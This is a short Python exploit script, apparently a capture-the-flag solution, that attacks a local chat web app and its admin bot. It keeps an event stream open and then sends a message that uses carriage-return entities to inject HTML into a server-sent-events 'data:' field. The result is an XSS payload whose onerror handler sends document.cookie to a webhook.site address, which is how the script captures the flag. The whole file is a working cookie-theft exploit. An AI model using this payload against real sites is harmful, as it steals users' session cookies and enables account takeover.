#!/usr/bin/env python3
import threading, time, requests

BOT_URL = "http://localhost:1337"
WEB_URL = "http://localhost:3000"
WEBHOOK_URL = "https://webhook.site/<guid>"  

bot_uuid = requests.post(BOT_URL + "/api/report").text \
    .replace("Bot is waiting with UUID: ", "").strip()
print(f"[+] Bot UUID: {bot_uuid}")

session = requests.Session()
session.get(WEB_URL + "/")

# Keep an SSE stream open so clients.get(from) stays valid in app.ts.
def keep_alive():
    try:
        with session.get(WEB_URL + "/api/events", stream=True) as r:
            for line in r.iter_lines():
                pass
    except Exception as e:
        print(f"[-] SSE closed: {e}")

threading.Thread(target=keep_alive, daemon=True).start()
time.sleep(1)  

js = f"fetch('{WEBHOOK_URL}/?c='+encodeURIComponent(document.cookie))"
message = f'<img src="PAD&#13;q">&#13;data: " onerror="{js}"<i>x</i>'

print("[+] Sending exploit message...")
resp = session.post(WEB_URL + "/api/send-message",
                    json={"message": message, "to": bot_uuid})
print(f"[-] Status: {resp.status_code}  Body: {resp.text}")
print(f"[*] Check {WEBHOOK_URL} for ?c=FLAG=Alpaca{{...}}")

time.sleep(2)
